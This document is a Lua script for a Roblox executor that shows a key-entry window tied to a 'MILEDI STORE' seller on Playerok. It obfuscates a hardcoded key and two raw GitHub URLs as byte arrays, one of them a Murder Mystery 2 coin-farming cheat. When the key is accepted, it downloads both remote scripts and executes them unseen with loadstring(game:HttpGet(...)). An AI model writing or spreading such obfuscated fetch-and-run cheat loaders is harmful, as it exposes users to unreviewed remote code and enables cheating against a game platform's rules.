-- Обфусцированный и с "скрытым" ключом и URL

local function fromBytes(t)
    local s=""
    for i=1,#t do s=s..string.char(t[i]) end
    return s
end

local k=fromBytes{80,108,97,121,101,114,111,107,32,77,73,76,69,68,73,32,83,84,79,82,69}
local u1=fromBytes{104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,102,117,114,113,119,107,47,100,105,112,47,114,101,102,115,47,104,101,97,100,115,47,109,97,105,110,47,109,111,115,116,46,108,117,97}
local u2=fromBytes{104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,115,112,97,119,110,101,114,115,99,114,105,112,116,47,77,117,114,100,101,114,77,121,115,116,101,114,121,50,47,114,101,102,115,47,104,101,97,100,115,47,109,97,105,110,47,102,97,114,109,99,111,105,110,46,108,117,97}

local p=game.Players.LocalPlayer
local g=p:WaitForChild("PlayerGui")

task.wait(0.1)

local s=Instance.new("ScreenGui")
s.Name="PlayerokKeyUI"
s.ResetOnSpawn=false
s.Parent=g

local f=Instance.new("Frame")
f.Size=UDim2.new(0,420,0,270)
f.Position=UDim2.new(0.5,0,0.5,0)
f.AnchorPoint=Vector2.new(0.5,0.5)
f.BackgroundColor3=Color3.fromRGB(15,15,25)
f.BorderSizePixel=0
f.Active=true
f.Draggable=true
f.Parent=s

local l=Instance.new("TextLabel",f)
l.Text="Playerok"
l.Size=UDim2.new(1,0,0,60)
l.Position=UDim2.new(0,0,0,10)
l.Font=Enum.Font.GothamBold
l.TextSize=44
l.TextColor3=Color3.fromRGB(44,181,230)
l.BackgroundTransparency=1

local d=Instance.new("TextLabel",f)
d.Text="Введите ключ от MILEDI STORE:"
d.Size=UDim2.new(1,-40,0,40)
d.Position=UDim2.new(0,20,0,70)
d.Font=Enum.Font.Gotham
d.TextSize=20
d.TextWrapped=true
d.TextColor3=Color3.fromRGB(170,200,220)
d.BackgroundTransparency=1
d.TextXAlignment=Enum.TextXAlignment.Left

local i=Instance.new("TextBox",f)
i.PlaceholderText="Введите ключ здесь..."
i.Size=UDim2.new(1,-40,0,45)
i.Position=UDim2.new(0,20,0,120)
i.Font=Enum.Font.Gotham
i.TextSize=20
i.TextColor3=Color3.fromRGB(220,220,255)
i.BackgroundColor3=Color3.fromRGB(30,30,50)
i.BorderSizePixel=0
i.ClearTextOnFocus=false

local b=Instance.new("TextButton",f)
b.Text="Подтвердить ключ"
b.Size=UDim2.new(1,-40,0,45)
b.Position=UDim2.new(0,20,0,175)
b.Font=Enum.Font.GothamBold
b.TextSize=22
b.TextColor3=Color3.fromRGB(255,255,255)
b.BackgroundColor3=Color3.fromRGB(44,181,230)
b.BorderSizePixel=0

local gk=Instance.new("TextButton",f)
gk.Text="Получить ключ"
gk.Size=UDim2.new(0,160,0,30)
gk.Position=UDim2.new(0,20,1,-25)
gk.Font=Enum.Font.Gotham
gk.TextSize=16
gk.TextColor3=Color3.fromRGB(255,255,255)
gk.BackgroundColor3=Color3.fromRGB(60,130,180)
gk.BorderSizePixel=0

local c=Instance.new("TextLabel",f)
c.Text=""
c.Size=UDim2.new(0,200,0,30)
c.Position=UDim2.new(0,190,1,-35)
c.Font=Enum.Font.Gotham
c.TextSize=14
c.TextColor3=Color3.fromRGB(120,255,120)
c.BackgroundTransparency=1
c.TextXAlignment=Enum.TextXAlignment.Left

local e=Instance.new("TextLabel")
e.Text=""
e.Size=UDim2.new(0,400,0,60)
e.Position=UDim2.new(1,-410,1,-80)
e.Font=Enum.Font.Gotham
e.TextSize=15
e.TextColor3=Color3.fromRGB(255,85,85)
e.BackgroundTransparency=1
e.TextWrapped=true
e.TextXAlignment=Enum.TextXAlignment.Right
e.TextYAlignment=Enum.TextYAlignment.Bottom
e.Parent=s

local function check(t) return t==k end

b.MouseButton1Click:Connect(function()
	if check(i.Text) then
		s:Destroy()
		loadstring(game:HttpGet(u1))()
		loadstring(game:HttpGet(u2))()
	else
		e.Text="Неверный ключ ❌"
		task.delay(3,function() e.Text="" end)
	end
end)

gk.MouseButton1Click:Connect(function()
	setclipboard("https://playerok.com/profile/MILEDI-STORE/products")
	c.Text="Ссылка скопирована!"
	task.delay(3,function() c.Text="" end)
end)
